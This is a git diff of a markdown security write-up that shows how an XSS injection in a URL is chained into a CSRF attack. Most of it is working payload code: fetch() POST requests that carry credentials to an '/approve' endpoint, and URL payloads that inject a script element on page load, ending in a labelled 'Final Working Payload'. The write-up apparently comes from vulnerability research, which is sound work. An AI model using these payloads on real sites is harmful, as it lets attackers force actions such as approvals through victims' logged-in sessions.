@@ -368,7 +368,8 @@ document.EventListener('DOMContentLoaded', function() {document.body.appendChild
 
 > Lets create working CSRF Fetch API for POST request, we tried for both content-type JSON and text,  however with JSON body it was giving some error in vulnerable app which but might work if given some time. the text one is working fine and is used in POC.
 
-> Building for JSON content-type
+
+Building for JSON content-type
 ```
 fetch('https://example.com/approve',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:'{}'}).then(console.log())
 ```
@@ -383,7 +384,8 @@ fetch('https://example.com/approve',{method:'POST',credentials:'include',headers
 https://example.com/"-document.EventListener('DOMContentLoaded', function() {document.body.appendChild(Object.assign(document.createElement('script'), { textContent: "fetch('https://example.com/approve',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:'{'user':'test'}'}).then(console.log())"}))})-"
 ```
 
-> Building for normal text/form/urlencoded content-type
+
+Building for normal text/form/urlencoded content-type
 ```
 fetch('https://example.com/approve',{method:'POST',body:'user=test&action=approve'}).then(console.log())
 ```
@@ -391,7 +393,10 @@ fetch('https://example.com/approve',{method:'POST',body:'user=test&action=approv
 https://example.com/"-document.EventListener('DOMContentLoaded', function() {document.body.appendChild(Object.assign(document.createElement('script'), { textContent: "fetch('https://example.com/approve',{method:'POST',body:'user=test&action=approve'}).then(console.log())"}))})-"
 ```
 
-> Final Working Payload
+
+Final Working Payload
+
+https://example.com/"-document.EventListener('DOMContentLoaded', function() {document.body.appendChild(Object.assign(document.createElement('script'), { textContent: "fetch('https://example.com/approve',{method:'POST',body:'user=test&action=approve'}).then(console.log())"}))})-"
 ```
 https://example.com/"-document.EventListener('DOMContentLoaded', function() {document.body.appendChild(Object.assign(document.createElement('script'), { textContent: "fetch('https://example.com/approve',{method:'POST',body:'user=test&action=approve'}).then(console.log())"}))})-"
 ```
